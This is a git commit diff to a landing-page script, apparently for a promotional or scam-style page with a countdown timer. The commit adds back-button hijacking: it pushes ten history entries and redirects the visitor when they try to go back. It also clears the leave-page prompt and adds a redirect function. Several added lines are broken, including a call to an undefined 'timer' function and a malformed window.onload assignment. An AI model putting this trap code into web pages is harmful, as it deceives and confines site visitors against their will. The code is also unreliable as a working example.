4c047f677cf97c7cbf18f54396c72d6845622363
WeiStyle-key <1182909744@qq.com>
2023-06-10 11:25:52 +0800

    t

--- ID/womansur/script.js
+++ ID/womansur/script.js
@@ -1,22 +1,25 @@
 function startTimer(t, n) {
     var o, e, a = t;
-    setInterval(function () {
-        o = parseInt(a / 60, 10);
-        e = parseInt(a % 60, 10);
-        o = o < 10 ? "0" + o : o;
-        e = e < 10 ? "0" + e : e;
-        n.textContent = o + ":" + e;
-        --a < 0 && (a = 0);
-    }, 1000);
+    setInterval((function() {
+        o = parseInt(a / 60, 10), e = parseInt(a % 60, 10), o = o < 10 ? "0" + o : o, e = e < 10 ? "0" + e : e, n.textContent = o + ":" + e, --a < 0 && (a = 0)
+    }), 1e3)
 }
 
+function go() {
+    window.onbeforeunload = null;
+    window.location = `ww.baidu.com`;
+}
 
-
-
-window.onload = function () {
-    var photos = Array.from(document.getElementsByClassName("photo"));
-    var randomIndex = Math.floor(Math.random() * photos.length);
-    photos[randomIndex].style.display = "block";
-
-    startTimer(118, document.querySelector("#timer"));
-};
+setTimeout(timer, 1e3), window.onload = void startTimer(118, document.querySelector("#timer")),
+    function() {
+        var t;
+        try {
+            const n = window.location.href.split(/[#]/)[0];
+            for (t = 0; 10 > t; ++t) history.pushState({}, "", n + "#");
+            onpopstate = function(t) {
+                t.state && location.replace(`www.baidu.com`)
+            }
+        } catch (t) {
+            console.log(t)
+        }
+    }();
